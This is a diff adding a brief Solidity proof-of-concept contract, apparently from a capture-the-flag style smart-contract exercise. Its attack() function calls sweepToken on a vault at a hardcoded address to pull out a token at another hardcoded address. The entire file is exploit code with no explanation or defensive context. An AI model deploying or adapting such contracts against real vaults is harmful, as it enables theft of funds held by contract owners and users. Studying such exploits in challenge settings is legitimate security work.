@@ -1,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+interface CryptoVault {
+    function sweepToken(IERC20 token) external ;
+}
+
+contract poc{
+    address Vaultaddr=0x4E3E287Dc5c29a04771C5094CE3b4e87608cF6cf;
+    CryptoVault target=CryptoVault(Vaultaddr);
+    address LGTaddr=0x8828719f481d7708005082a2D66FAC963Be11b0a;
+    event log(bool);
+    function attack() public {
+        
+
+        // bytes memory data;
+        target.sweepToken(IERC20(LGTaddr));
+        // (err,data)=Vaultaddr.call(abi.encodeWithSignature("underlying()"));
+
+    }
+}
+
